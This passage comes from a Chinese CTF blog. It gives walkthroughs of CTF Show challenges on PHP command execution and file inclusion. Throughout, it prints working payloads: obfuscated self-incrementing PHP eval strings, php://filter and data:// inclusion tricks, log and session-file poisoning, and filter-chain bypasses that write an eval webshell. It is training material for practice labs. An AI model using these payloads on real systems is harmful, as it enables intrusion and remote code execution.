class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$_</span>=$<span class="variable">$____</span>;<span class="built_in">eval</span>(<span class="variable">$___</span>(<span class="variable">$_</span>[_]));highlight_file(__FILE__);<span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];<span class="keyword">if</span> (!preg_match(<span class="string">&quot;/[!@#%^&amp;*:&#x27;\&quot;|`a-zA-BD-Z~\\\\]|[4-9]/&quot;</span>,<span class="variable">$ctfshow</span>))&#123;	<span class="built_in">echo</span> <span class="string">&#x27;111&#x27;</span>;	<span class="built_in">eval</span>(<span class="variable">$a</span>);&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#get?looklook=1#postctf[show=%24_%3DC%3B%24___%3D%24_%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___%3D%24__%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24____%3D_%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24_%3D%24%24____%3B%24___(%24_%5B_%5D)%3B&amp;_=ls;</span></span><br></pre></td></tr></table></figure>

<p><strong>长度限制：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># get?looklook=1&amp;1=passthru&amp;2=tac /flag.txt# postctf[show=$_=C;$_++;$C=++$_;$_++;$C_=++$_;$_=(C/C.C)&#123;0&#125;;$_++;$_++;$_++;$_++;$_++;$_=_.$C_.$C.++$_;$&#123;$_&#125;&#123;1&#125;($&#123;$_&#125;&#123;2&#125;);</span></span><br></pre></td></tr></table></figure>

<h2 id="吃瓜"><a href="#吃瓜" class="headerlink" title="吃瓜"></a>吃瓜</h2><p><img src="https://i.loli.net/2021/08/14/Rn7LtWDXEldPBp3.png" alt="image-20210814215714938"></p>
<p>50 4B 03 04 ZIP文件</p>
<p><img src="https://i.loli.net/2021/08/14/KY4lPejVoOUiqbt.png" alt="image-20210814215832498"></p>
<p><img src="https://i.loli.net/2021/08/14/LiNXRJ9SHnwVtEz.png" alt="image-20210814220223592"></p>
<p>这是用来迷惑的</p>
<p>存在一个文本文档，是个 图片，浏览器访问</p>
<p><img src="https://i.loli.net/2021/08/16/78L6POtr1spjlBE.png" alt="image-20210816210645822"></p>
<p>扫描得到    cfhwc19abika_etso{h_u_e_ui1}</p>
<p>查看图片属性</p>
<p><img src="https://i.loli.net/2021/08/16/M1JngkVhvbPIDOC.png" alt="image-20210816211218664"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">✿❇✼❄✿❇✼❂❃❆✿✽❂❁❉✼==<span class="comment"># 不知道怎末用</span></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/08/16/FyR5WpEugQI9ShK.png" alt="image-20210816211549442"></p>
<h1 id="二、总结"><a href="#二、总结" class="headerlink" title="二、总结"></a>二、总结</h1><h2 id="命令执行做题思路"><a href="#命令执行做题思路" class="headerlink" title="命令执行做题思路"></a>命令执行做题思路</h2><ol>
<li><p>一眼就有思路的直接掠过</p>
</li>
<li><p>一眼没有思路的，首先根据正则的过滤分类，决定思路</p>
<ul>
<li><p>有回显？无回显？ eval    exec</p>
</li>
<li><p>eval  还是  system</p>
</li>
<li><p>无字母数字类？</p>
<p>异或？或？取反？自增？</p>
</li>
<li><p>过滤 ;</p>
</li>
<li><p>过滤 ‘ ‘    “ “</p>
</li>
<li><p>找 phpinfo() 看被 ban 的函数名</p>
</li>
</ul>
</li>
</ol>
]]></content>
      <categories>
        <category>CTF Show</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF-Show-文件包含</title>
    <url>/2021/10/01/CTF-Show-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>CTF Show 文件包含篇。</p>
<span id="more"></span>

<h1 id="一、CTF-Show-—-文件包含"><a href="#一、CTF-Show-—-文件包含" class="headerlink" title="一、CTF Show — 文件包含"></a>一、CTF Show — 文件包含</h1><h2 id="1-1-Web-78-—-最简单的文件包含-—-各种伪协议-绕过"><a href="#1-1-Web-78-—-最简单的文件包含-—-各种伪协议-绕过" class="headerlink" title="1.1 Web 78 — 最简单的文件包含 — 各种伪协议 绕过"></a>1.1 Web 78 — 最简单的文件包含 — 各种伪协议 绕过</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>   </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?file=php://filter/<span class="built_in">read</span>=convert.base64-encode/resource=flag.php</span><br><span class="line">?file=data://text/plain,&lt;?php system(<span class="string">&#x27;cat flag.php&#x27;</span>); ?&gt;<span class="comment">#查看源代码</span></span><br><span class="line">?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTsgPz4=</span><br><span class="line"><span class="comment">#PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTsgPz4=内容是&lt;?php system(&#x27;cat flag.php&#x27;); ?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="1-2-Web-79-—-过滤-php-—-data-base64-绕过"><a href="#1-2-Web-79-—-过滤-php-—-data-base64-绕过" class="headerlink" title="1.2 Web 79 — 过滤 php — data:// base64 绕过"></a>1.2 Web 79 — 过滤 php — data:// base64 绕过</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTsgPz4=</span><br></pre></td></tr></table></figure>

<h2 id="1-3-Web-80-—-过滤-php、data-—-日志文件包含（同时写上代码）"><a href="#1-3-Web-80-—-过滤-php、data-—-日志文件包含（同时写上代码）" class="headerlink" title="1.3 Web 80 — 过滤 php、data — 日志文件包含（同时写上代码）"></a>1.3 Web 80 — 过滤 php、data — 日志文件包含（同时写上代码）</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>抓包可知：nginx 服务器</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#包含日志文件</span></span><br><span class="line">?file=/var/<span class="built_in">log</span>/nginx/access.log</span><br><span class="line">写入php代码</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/07/16/z4KZLdVwSmr8nH9.png" alt="image-20210716215042378"></p>
<p><img src="https://i.loli.net/2021/10/01/VW871dxkePXusAl.png" alt="image-20210716215142577"></p>
<h2 id="1-4-Web-81-—-过滤-php、data、-—-日志文件包含（同时写上代码）"><a href="#1-4-Web-81-—-过滤-php、data、-—-日志文件包含（同时写上代码）" class="headerlink" title="1.4 Web 81 —  过滤 php、data、: — 日志文件包含（同时写上代码）"></a>1.4 Web 81 —  过滤 php、data、: — 日志文件包含（同时写上代码）</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#同上，日志包含</span></span><br></pre></td></tr></table></figure>

<h2 id="1-5-Web-82-86-—-过滤-php、data、-、-—-SESSION-文件包含"><a href="#1-5-Web-82-86-—-过滤-php、data、-、-—-SESSION-文件包含" class="headerlink" title="1.5 Web 82-86 —  过滤 php、data、: 、. — SESSION 文件包含"></a>1.5 Web 82-86 —  过滤 php、data、: 、. — SESSION 文件包含</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];    <span class="variable">$file</span> = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);    <span class="variable">$file</span> = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);    <span class="variable">$file</span> = str_replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);    <span class="variable">$file</span> = str_replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);    <span class="keyword">include</span>(<span class="variable">$file</span>);&#125;<span class="keyword">else</span>&#123;    highlight_file(<span class="keyword">__FILE__</span>);&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 利用PHP_SESSION_UPLOAD_PROGRESS加条件竞争进行文件包含</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt;&lt;form action=<span class="string">&quot;http://708cd0ba-4c4a-40c7-b53c-0dca6ac256fe.challenge.ctf.show:8080/&quot;</span> method=<span class="string">&quot;POST&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;    &lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> value=<span class="string">&quot;123&quot;</span> /&gt;    &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;file&quot;</span> /&gt;    &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;submit&quot;</span> /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>任意上传一个文件</p>
<p><img src="https://i.loli.net/2021/07/19/wez3hdLsB7DfiOa.png" alt="image-20210719173916491"></p>
<p><img src="https://i.loli.net/2021/07/19/Ix5UvQDhOEAqlKr.png" alt="image-20210719173943208"></p>
<p><img src="https://i.loli.net/2021/07/19/Nz4CGTBXFSsowMt.png" alt="image-20210719173601510"></p>
<p><img src="https://i.loli.net/2021/07/19/ptBEzodScA4rYuq.png" alt="image-20210719173814926"></p>
<h2 id="利用-session-upload-progress-进行文件包含利用"><a href="#利用-session-upload-progress-进行文件包含利用" class="headerlink" title="利用 session.upload_progress 进行文件包含利用"></a>利用 session.upload_progress 进行文件包含利用</h2><p><a href="https://www.cnblogs.com/NPFS/p/13795170.html">https://www.cnblogs.com/NPFS/p/13795170.html</a></p>
<p><a href="https://www.freebuf.com/news/202819.html">https://www.freebuf.com/news/202819.html</a></p>
<p><strong>目的：利用 session.upload_progress 将木马写入 session 文件，然后包含 session 文件</strong></p>
<ul>
<li><p>创建 session 文件（无 session_start() ）</p>
<ul>
<li><p>选项 <code>session.auto_start=On</code>  ，PHP在接收请求时会自动初始化 Session，不需要执行 session_start()。默认情况下，该选项 <code>关闭</code> 。</p>
</li>
<li><p>选项 <code>session.use_strict_mode=0</code> ，默认值是0即未启动时，用户可以自定义 session。</p>
<p>方法：用户自己抓包，在 Cookie 里面设置，PHPSESSION=flag，那么PHP将会在服务器上也创建一个文件 <code>/tmp/sess_flag</code>  。这时用户并没有初始化 session ，php也照样自动初始化 session，而产生了一个键值，该键值由 <code>ini.get(&quot;session.upload_progress.prefix&quot;)+我们构造的session.upload_progress.name</code> 一起组成，最终写入 <code>sess_文件</code> li里。</p>
<p>linux 下，session文件一般的默认存储位置是 <code>/tmp 或 /var/lib/php/session</code></p>
</li>
</ul>
</li>
<li><p>避免 <code>session.upload_progress.cleanup=on</code> 的干扰</p>
<p>该选项导致文件成功上传之后，一旦读取 POST 信息之后，会清除进度信息，session 文件将会被立即清理。重点是 该选项默认开启。</p>
<ul>
<li>方法：<strong>条件竞争</strong></li>
</ul>
</li>
</ul>
<p><img src="https://img2020.cnblogs.com/blog/1999159/202010/1999159-20201010194658099-100509760.png" alt="img"></p>
<p><img src="https://img2020.cnblogs.com/blog/1999159/202010/1999159-20201010195459494-303350987.png" alt="img"></p>
<h2 id="1-6-Web-87-—-过滤-php、data、-、-—-死亡绕过"><a href="#1-6-Web-87-—-过滤-php、data、-、-—-死亡绕过" class="headerlink" title="1.6 Web 87 — 过滤 php、data、: 、.  — 死亡绕过"></a>1.6 Web 87 — 过滤 php、data、: 、.  — 死亡绕过</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];    <span class="variable">$content</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>];    <span class="variable">$file</span> = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);    <span class="variable">$file</span> = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);    <span class="variable">$file</span> = str_replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);    <span class="variable">$file</span> = str_replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);    file_put_contents(urldecode(<span class="variable">$file</span>), <span class="string">&quot;&lt;?php die(&#x27;大佬别秀了&#x27;);?&gt;&quot;</span>.<span class="variable">$content</span>);    &#125;<span class="keyword">else</span>&#123;    highlight_file(<span class="keyword">__FILE__</span>);&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># post?content=aaPD9waHAgc3lzdGVtKCdscycpOyA/Pg==# PD9waHAgc3lzdGVtKCdscycpOyA/Pg== 是 &lt;?php system(&#x27;ls&#x27;); ?&gt;#file=php://filter/write=convert.base64-decode/resource=1.php</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># php://filter/write=convert.base64-decode/resource=1.php# 进行 url双编码# get?file=%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%64%25%36%33%25%36%66%25%36%65%25%37%36%25%36%35%25%37%32%25%37%34%25%32%65%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%34%25%36%35%25%36%33%25%36%66%25%36%34%25%36%35%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%33%31%25%32%65%25%37%30%25%36%38%25%37%30</span></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/07/20/U2oHgyTDBpAMsCu.png" alt="image-20210720113808797"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 更改 content ?content=aaPD9waHAgc3lzdGVtKCdjYXQgZmwwZy5waHAnKTsgPz4=#解码是 &lt;?php system(&#x27;cat fl0g.php&#x27;); ?&gt;</span></span><br></pre></td></tr></table></figure>

<p>访问得到</p>
<p><img src="https://i.loli.net/2021/10/01/OpuNI68AKWTye52.png" alt="image-20210720113952940"></p>
<h2 id="1-7-Web-88-—-过滤-—-拼凑-php-语句"><a href="#1-7-Web-88-—-过滤-—-拼凑-php-语句" class="headerlink" title="1.7 Web 88 — 过滤 + = — 拼凑 php 语句"></a>1.7 Web 88 — 过滤 + = — 拼凑 php 语句</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/php|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\=|\./i&quot;</span>, <span class="variable">$file</span>))&#123;        <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);    &#125;    <span class="keyword">include</span>(<span class="variable">$file</span>);&#125;<span class="keyword">else</span>&#123;    highlight_file(<span class="keyword">__FILE__</span>);&#125; </span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 注意不能出现= 和 +?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdscycpOyA/PmFi# PD9waHAgc3lzdGVtKCdscycpOyA/PmFi 解码是 &lt;?php system(&#x27;ls&#x27;); ?&gt;ab</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmwwZy5waHAnKTsgPz5h<span class="comment"># PD9waHAgc3lzdGVtKCdjYXQgZmwwZy5waHAnKTsgPz5h 解码是 &lt;?php system(&#x27;cat fl0g.php&#x27;); ?&gt;a</span></span><br></pre></td></tr></table></figure>

<h2 id="1-8-Web-117-—-convert-iconv-死亡绕过"><a href="#1-8-Web-117-—-convert-iconv-死亡绕过" class="headerlink" title="1.8 Web 117 — convert.iconv.* + 死亡绕过"></a>1.8 Web 117 — convert.iconv.* + 死亡绕过</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    highlight_file(<span class="keyword">__FILE__</span>);error_reporting(<span class="number">0</span>);<span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$x</span></span>)</span>&#123;    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i&#x27;</span>,<span class="variable">$x</span>))&#123;        <span class="keyword">die</span>(<span class="string">&#x27;too young too simple sometimes naive!&#x27;</span>);    &#125;&#125;<span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];<span class="variable">$contents</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;contents&#x27;</span>];filter(<span class="variable">$file</span>);file_put_contents(<span class="variable">$file</span>, <span class="string">&quot;&lt;?php die();?&gt;&quot;</span>.<span class="variable">$contents</span>); </span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 过滤掉了我们常使用的过滤器，我们可以使用别的 例如：convert.iconv.*</span></span><br></pre></td></tr></table></figure>

<p>它的编码解码与函数 <code>iconv()</code> 一致</p>
<p><img src="https://i.loli.net/2021/10/01/JobfmHWAMNvRi5Z.png" alt="image-20210720120252523"></p>
<p><a href="https://blog.csdn.net/qq_44657899/article/details/109319686">https://blog.csdn.net/qq_44657899/article/details/109319686</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span><span class="keyword">echo</span> iconv(<span class="string">&quot;UCS-2LE&quot;</span>,<span class="string">&quot;UCS-2BE&quot;</span>,<span class="string">&#x27;&lt;?php @eval($_POST[ab]);?&gt;&#x27;</span>); <span class="comment"># ?&lt;hp pe@av(l_$OPTSa[]b;)&gt;?</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># get?file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=3.php# postcontents=?&lt;hp pe@av(l_$OPTSa[]b;)&gt;?</span></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/10/01/XSdDRwM7zJa14WV.png" alt="image-20210720121650119"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># postab=system(&#x27;cat flag.php&#x27;);</span></span><br></pre></td></tr></table></figure>

<h2 id="1-9-Web-116-—"><a href="#1-9-Web-116-—" class="headerlink" title="1.9 Web 116 —"></a>1.9 Web 116 —</h2><p>misc+lfi</p>
<p>将视频 在 Kali 下进行 binwalk</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">binwalk -e 1.pngbinbalk -D=png 1.mp4		<span class="comment"># 获取图片</span></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/08/02/CKV7dYLy4lP6eBu.png" alt="image-20210802153007262"></p>
<p><img src="https://i.loli.net/2021/08/02/mHgrCUQj6vVKt4e.png" alt="image-20210802153516688"></p>
<p>然后直接 <code>?file=php://filter/resource=flag.php</code> 即可 ，但需要查看源码，页面上查看不了，我们可以抓包查看</p>
<h1 id="二、总结"><a href="#二、总结" class="headerlink" title="二、总结"></a>二、总结</h1><p>文件包含 include() 函数</p>
<p><strong>读文件</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?file=php://filter/<span class="built_in">read</span>=convert.base64-encode/resource=flag.php?file=data://text/plain,&lt;?php system(<span class="string">&#x27;cat flag.php&#x27;</span>); ?&gt;<span class="comment">#查看源代码?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTsgPz4=#PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTsgPz4=内容是&lt;?php system(&#x27;cat flag.php&#x27;); ?&gt;?file=php://inputpost:&lt;?php	system(&#x27;ls&#x27;);</span></span><br></pre></td></tr></table></figure>

<p><strong>写文件</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># get?file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=3.php?contents=?&lt;hp pe@av(l_$OPTSa[]b;)&gt;?</span></span><br></pre></td></tr></table></figure>

